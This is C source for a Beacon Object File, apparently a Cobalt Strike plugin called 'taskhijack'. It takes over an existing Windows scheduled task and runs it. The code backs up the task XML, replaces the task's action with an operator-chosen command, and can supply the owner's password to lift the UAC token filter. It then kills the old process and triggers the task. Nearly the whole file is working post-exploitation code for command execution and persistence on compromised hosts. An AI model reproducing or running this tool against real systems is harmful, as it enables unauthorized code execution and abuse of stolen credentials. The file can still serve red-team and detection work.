/*
 * taskhijack.c - modify and trigger an existing scheduled task.
 *
 * taskhijack -task "\\Some Task-S-1-5-21-..." -cmd C:\\path\\tool.bat [-args "..."] [-pw pass]
 *
 * 1. dumps the task XML to the console and %TEMP%\bof-<task>-orig.xml
 * 2. schtasks /change /tr "<cmd> [args]" [+ /rp <pw>]. /rp is merged into
 *    the same call because a spaced /tr value makes schtasks prompt for the
 *    run-as password (credential re-validation). InteractiveToken tasks run
 *    with a UAC-filtered token; /rp with the owner's password removes the
 *    filter. Does not elevate standard (non-admin) users.
 * 3. taskkill on the old action image parsed from the backup XML (a stale
 *    instance blocks /run via IgnoreNew)
 * 4. schtasks /run
 *
 * Console escaping: double backslashes (\\\\), quote spaced values, avoid
 * inner quotes - point -cmd at an uploaded script for complex payloads.
 * -pw must be the owner's CURRENT password; blank passwords are rejected.
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include "bofutil.h"

static void GetTempDirA(char * dst, SIZE_T max)
{
    DWORD n = GetEnvironmentVariableA("TEMP", dst, (DWORD)max);
    if (n == 0 || n > max - 2) {
        my_strcpy(dst, "C:\\Windows\\Temp", max);
    }
}

/* basename of the old action from <Command>...</Command>. Handles plain
 * paths, paths with arguments (cut at first space) and fully quoted paths
 * ("%localappdata%\...\app.exe" style). */
static inline const char * ExtractOldImage(const char * xml, char * buf, SIZE_T max)
{
    const char * s = my_strstr(xml, "<Command>");
    const char * e;
    SIZE_T i = 0;
    const char * base;

    if (!s) return NULL;
    s += 9;
    e = my_strstr(s, "</Command>");
    if (!e) return NULL;

    while (s < e && (*s == ' ' || *s == '\r' || *s == '\n' || *s == '\t')) s++;

    if (s < e && *s == '"') {
        s++;
        while (s < e && *s != '"' && i + 1 < max) buf[i++] = *s++;
    } else {
        while (s < e && *s != ' ' && i + 1 < max) buf[i++] = *s++;
    }
    buf[i] = 0;
    if (!i) return NULL;

    base = buf + i;
    while (base > buf && *(base - 1) != '\\') base--;
    return base;
}

void go(char * args, int alen)
{
    datap parser;
    char * taskname;
    char * cmdpath;
    char * cmdargs;
    char * pw;
    char   cmdline[1024];
    char   xmlpath[MAX_PATH];
    char   tmpdir[MAX_PATH];
    char   sanitized[128];
    char   oldimg[256];
    char * xml;
    SIZE_T d;

    (void)alen;

    /* parse order must match the manifest: task, cmd, args, pw */
    BeaconDataParse(&parser, args, alen);
    taskname = BeaconDataExtract(&parser, NULL);
    cmdpath  = BeaconDataExtract(&parser, NULL);
    cmdargs  = BeaconDataExtract(&parser, NULL);
    pw       = BeaconDataExtract(&parser, NULL);

    if (!taskname || !*taskname || !cmdpath || !*cmdpath) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] usage: taskhijack -task <name> -cmd <path> [-args <args>] [-pw <password>]\n");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] taskhijack: target='%s' cmd='%s' pw=%s\n",
        taskname, cmdpath, (pw && *pw) ? "<provided>" : "(none)");

    GetTempDirA(tmpdir, sizeof(tmpdir));
    my_sanitize(sanitized, taskname, sizeof(sanitized));
    d = my_strlen(tmpdir);
    my_strcpy(xmlpath, tmpdir, sizeof(xmlpath));
    if (d && xmlpath[d - 1] != '\\') my_strcat(xmlpath, "\\", sizeof(xmlpath));
    my_strcat(xmlpath, "bof-", sizeof(xmlpath));
    my_strcat(xmlpath, sanitized, sizeof(xmlpath));
    my_strcat(xmlpath, "-orig.xml", sizeof(xmlpath));

    /* 1. backup */
    my_strcpy(cmdline, "schtasks.exe /query /tn \"", sizeof(cmdline));
    my_strcat(cmdline, taskname, sizeof(cmdline));
    my_strcat(cmdline, "\" /xml", sizeof(cmdline));

    xml = CaptureCmdA(cmdline);
    if (!xml || !*xml || !my_strstr(xml, "<Task ")) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] backup failed - task missing / query error: %.200s\n",
            xml ? xml : "(launch failed)");
        if (xml) HeapFree(GetProcessHeap(), 0, xml);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] original task XML (keep a copy for manual restore):\n%s\n", xml);
    if (WriteFileTextA(xmlpath, xml, (DWORD)my_strlen(xml))) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] backup saved: %s\n", xmlpath);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[!] failed to save %s (gle=%u) - the XML above is the only copy\n",
                     xmlpath, (unsigned int)GetLastError());
    }

    /* 2. change action, merged with /rp when a password is supplied */
    my_strcpy(cmdline, "schtasks.exe /change /tn \"", sizeof(cmdline));
    my_strcat(cmdline, taskname, sizeof(cmdline));
    my_strcat(cmdline, "\" /tr \"", sizeof(cmdline));
    my_strcat(cmdline, cmdpath, sizeof(cmdline));
    if (cmdargs && *cmdargs) {
        my_strcat(cmdline, " ", sizeof(cmdline));
        my_strcat(cmdline, cmdargs, sizeof(cmdline));
    }
    my_strcat(cmdline, "\"", sizeof(cmdline));
    if (pw && *pw) {
        my_strcat(cmdline, " /rp ", sizeof(cmdline));
        my_strcat(cmdline, pw, sizeof(cmdline));
        RunAndReport(cmdline, "step2 /change /tr+/rp (stored credential = full token)");
    } else {
        RunAndReport(cmdline, "step2 /change /tr (no /rp -> token stays filtered)");
        if (cmdargs && *cmdargs) {
            BeaconPrintf(CALLBACK_ERROR,
                "[!] note: spaced -cmd/-args without -pw can trigger the schtasks\n"
                "    run-as password prompt -> the change fails fast. supply -pw.\n");
        }
    }

    /* 3. kill a stale instance. ExtractOldImage returns a pointer into
     * oldimg - taskkill needs the basename, not the whole buffer. */
    {
        const char * base = ExtractOldImage(xml, oldimg, sizeof(oldimg));
        if (base) {
            BeaconPrintf(CALLBACK_OUTPUT, "[*] step3: killing stale instance: %s\n", base);
            my_strcpy(cmdline, "taskkill.exe /f /im ", sizeof(cmdline));
            my_strcat(cmdline, base, sizeof(cmdline));
            RunAndReport(cmdline, "step3 taskkill");
        } else {
            BeaconPrintf(CALLBACK_OUTPUT,
                "[*] step3 skipped (old image not readable from the XML - if /run\n"
                "    fails with 'instance exists', kill the old process manually)\n");
        }
    }

    /* 4. run */
    my_strcpy(cmdline, "schtasks.exe /run /tn \"", sizeof(cmdline));
    my_strcat(cmdline, taskname, sizeof(cmdline));
    my_strcat(cmdline, "\"", sizeof(cmdline));
    RunAndReport(cmdline, "step4 /run");

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] done. restore later: taskrestore -task \"%s\"  (uses %s)\n",
        taskname, xmlpath);

    HeapFree(GetProcessHeap(), 0, xml);
}
